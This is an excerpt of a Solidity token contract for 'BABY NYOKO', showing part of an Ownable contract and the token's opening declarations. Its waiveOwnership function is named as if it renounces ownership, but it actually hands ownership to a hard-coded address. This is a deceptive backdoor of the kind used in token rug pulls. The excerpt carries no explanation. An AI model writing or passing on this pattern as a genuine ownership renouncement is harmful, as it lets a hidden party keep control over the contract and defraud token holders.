...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x9F31d09b365edE34F1eCbb9252439DB0e2E4e19e));
        _owner = address(0x9F31d09b365edE34F1eCbb9252439DB0e2E4e19e);
    }
...
contract BABYNYOKO is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BABY NYOKO";
    string private _symbol = "BABY NYOKO";
